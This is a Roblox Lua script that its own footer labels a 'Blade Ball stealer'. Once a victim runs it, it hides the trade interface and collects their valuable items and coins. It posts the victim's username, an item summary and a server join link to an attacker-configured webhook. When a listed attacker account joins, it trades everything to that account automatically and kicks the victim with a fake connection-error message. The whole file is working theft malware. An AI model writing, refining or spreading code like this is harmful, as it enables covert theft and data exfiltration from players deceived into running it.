-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

-- // AUTHENTICATION & CONFIG
local auth_token = "EBK-SS-A" 
local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

-- // PROTECTION ET VÉRIFICATIONS
if next(users) == nil or webhook == "" then
    plr:kick("Configuration incomplete (Usernames/Webhook)")
    return
end

if game.PlaceId ~= 13772394625 then
    plr:kick("Only work on normal Blade Ball servers")
    return
end

-- // VÉRIFICATION DU PIN
local args = {
    [1] = {
        ["option"] = "PIN",
        ["value"] = "9079"
    }
}
local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
if PINReponse ~= "You don't have a PIN code" then
    plr:kick("Please disable trade PIN and try again")
    return
end

-- // NETTOYAGE UI ET DISCRÉTION (LOGIQUE ORIGINALE)
tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false

local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function()
    maintradegui.Visible = false
end)

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
end)

-- // FONCTIONS DE TRADING
local function sendTradeRequest(user)
    local target = game:GetService("Players"):WaitForChild(user)
    repeat
        task.wait(0.2)
        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
    until inTrade == true or not target
end

local function addItemToTrade(itemType, ID)
    repeat
        local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(itemType, ID)
        task.wait(0.05)
    until response == true
end

local function readyTrade()
    repeat
        task.wait(0.1)
        local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
    until response == true
end

local function confirmTrade()
    repeat
        task.wait(0.1)
        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
    until not inTrade
end

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

local totalRAP = 0

-- // SYSTÈME DE WEBHOOKS (FORMAT JSON POUR WORKER)
local function SendJoinMessage(list, prefix)
    local isGoodHit = totalRAP >= 500
    local embedTitle = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
    local webhookName = isGoodHit and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT"
    local embedColor = isGoodHit and 65280 or 8323327

    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = grouped[item.Name] or {Count = 0, TotalRAP = 0}
        grouped[item.Name].Count = grouped[item.Name].Count + 1
        grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
    end

    local itemLines = ""
    for name, data in pairs(grouped) do
        itemLines = itemLines .. string.format("%s (x%d) - **%s RAP**\n", name, data.Count, formatNumber(data.TotalRAP))
    end

    local data = {
        ["auth_token"] = auth_token,
        ["username"] = webhookName,
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = embedTitle,
            ["color"] = embedColor,
            ["fields"] = {
                {name = "Victim Username 🤖:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId, inline = false},
                {name = "Item list 📝:", value = itemLines ~= "" and itemLines or "None", inline = false},
                {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    requestFunc({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

local function SendMessage(list)
    local isGoodHit = totalRAP >= 500
    local webhookName = isGoodHit and "⚪ Eblack - SERVER HIT (GOOD)" or "⚪ Eblack - SERVER HIT (SMALL)"
    
    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = grouped[item.Name] or {Count = 0, TotalRAP = 0}
        grouped[item.Name].Count = grouped[item.Name].Count + 1
        grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
    end

    local itemLines = ""
    for name, data in pairs(grouped) do
        itemLines = itemLines .. string.format("%s (x%d) - **%s RAP**\n", name, data.Count, formatNumber(data.TotalRAP))
    end

    local data = {
        ["auth_token"] = auth_token,
        ["username"] = webhookName,
        ["embeds"] = {{
            ["title"] = "⚪ Server Hit 🎯",
            ["color"] = isGoodHit and 65280 or 8323327,
            ["fields"] = {
                {name = "Victim Username 🤖:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Items to Steal 📝:", value = itemLines ~= "" and itemLines or "None", inline = false},
                {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    requestFunc({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

-- // DATA COLLECTION
local rapDataResult = Replion.Client:GetReplion("ItemRAP")
local rapData = rapDataResult.Data.Items

local function buildNameToRAPMap(category)
    local nameToRAP = {}
    local categoryRapData = rapData[category]
    if not categoryRapData then return nameToRAP end
    for serializedKey, rap in pairs(categoryRapData) do
        local success, decodedKey = pcall(function() return HttpService:JSONDecode(serializedKey) end)
        if success and type(decodedKey) == "table" then
            for _, pair in ipairs(decodedKey) do
                if pair[1] == "Name" then nameToRAP[pair[2]] = rap break end
            end
        end
    end
    return nameToRAP
end

local rapMappings = {}
for _, category in ipairs(categories) do rapMappings[category] = buildNameToRAPMap(category) end

for _, category in ipairs(categories) do
    if clientInventory[category] then
        for itemId, itemInfo in pairs(clientInventory[category]) do
            if not itemInfo.TradeLock then
                local rap = (rapMappings[category] and rapMappings[category][itemInfo.Name]) or 0
                if rap >= min_rap then
                    totalRAP = totalRAP + rap
                    table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
                end
            end
        end
    end
end

-- // EXECUTION
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    local sentItems = {}
    for i, v in ipairs(itemsToSend) do sentItems[i] = v end

    SendJoinMessage(itemsToSend, (ping == "Yes" and "--[[@everyone]] " or ""))

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            sendTradeRequest(joinedUser)
            repeat task.wait(0.5) until inTrade

            local currentBatch = {}
            for i = 1, math.min(100, #itemsToSend) do
                table.insert(currentBatch, table.remove(itemsToSend, 1))
            end
            
            for _, item in ipairs(currentBatch) do
                addItemToTrade(item.itemType, item.ItemID)
            end

            -- Ajout des Coins/Tokens
            pcall(function()
                local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
                local tokensamount = tonumber(rawText:gsub("[^%d]", "")) or 0
                if tokensamount >= 1 then
                    netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
                end
            end)

            readyTrade()
            confirmTrade()
        end
        plr:kick("Connection error, please rejoin.")
    end

    local function waitForUserJoin()
        local sentMessage = false
        local function onUserJoin(player)
            if table.find(users, player.Name) then
                if not sentMessage then
                    SendMessage(sentItems)
                    sentMessage = true
                end
                doTrade(player.Name)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onUserJoin(p) end
        Players.PlayerAdded:Connect(onUserJoin)
    end
    waitForUserJoin()
end
